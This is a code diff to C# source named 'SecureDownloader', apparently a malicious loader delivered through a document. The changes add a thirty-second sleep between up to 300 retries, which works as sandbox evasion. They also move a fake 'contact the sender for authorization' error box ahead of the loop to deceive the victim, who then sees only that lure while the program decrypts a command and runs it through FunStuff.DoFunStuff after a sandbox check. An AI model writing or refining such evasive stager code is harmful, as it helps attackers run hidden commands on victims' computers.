@@ -213,7 +213,7 @@ namespace SecureDownloader {
         // PS> $algo = [Security.Cryptography.HashAlgorithm]::Create("SHA256")
         // PS> $result = [System.BitConverter]::ToString($algo.ComputeHash([System.Text.Encoding]::Unicode.GetBytes($text))).ToLower() -replace "-",""
         const string origHash = "<GENERATE HASH WITH ABOVE>";
-        const int SLEEPTIME = 30;
+        const int SLEEPTIME = 30000;
         static void Main() {
             SandboxCheck.izSafe();
 
@@ -232,6 +232,8 @@ namespace SecureDownloader {
             byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
             byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);
 
+            MessageBox.Show("Please contact the sender of the document for authorization.", "An error occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
             int retries = 300;
             string decodedCmd = String.Empty;
             do
@@ -247,11 +249,10 @@ namespace SecureDownloader {
                         break;
                     }
                 }
-
+                System.Threading.Thread.Sleep(SLEEPTIME);
                 retries--;
             } while (retries > 0);
 
-            MessageBox.Show("Please contact the sender of the document for authorization.", "An error occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
             FunStuff.DoFunStuff(decodedCmd);
         }
     }
